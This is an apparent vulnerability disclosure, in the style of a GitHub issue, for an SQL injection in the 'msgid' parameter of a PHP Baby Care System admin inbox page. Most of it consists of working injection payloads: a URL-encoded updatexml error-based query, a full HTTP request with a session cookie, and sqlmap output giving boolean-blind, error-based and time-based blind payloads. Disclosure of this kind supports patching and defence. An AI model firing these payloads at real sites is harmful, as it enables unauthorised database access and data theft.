## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/inbox.php&action=read&msgid=

![image](https://user-images.githubusercontent.com/54017627/161354868-cc09a2cd-ef2a-4185-a6a9-9c70eb9c0c29.png)

Vulnerability location: /BabyCare/admin.php?id=inbox&action=read&msgid=11 //msgid is Injection point

[+]Payload:  /BabyCare/admin.php?id=inbox&action=read&msgid=11%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //msgid is Injection point

```sql
GET /BabyCare/admin.php?id=inbox&action=read&msgid=11%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161354750-1f5d471f-7c65-4025-b497-b1c04399c8c8.png)

```sql
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=inbox&action=read&msgid=11' AND 4681=4681 AND 'xjEi'='xjEi

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=inbox&action=read&msgid=11' AND (SELECT 9382 FROM(SELECT COUNT(*),CONCAT(0x716b707871,(SELECT (ELT(9382=9382,1))),0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'TmlF'='TmlF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=inbox&action=read&msgid=11' AND (SELECT 7228 FROM (SELECT(SLEEP(5)))cyYg) AND 'PNfI'='PNfI
---
```

![image](https://user-images.githubusercontent.com/54017627/161354890-0bdea68d-69f7-4945-a32e-de5c49329d50.png)
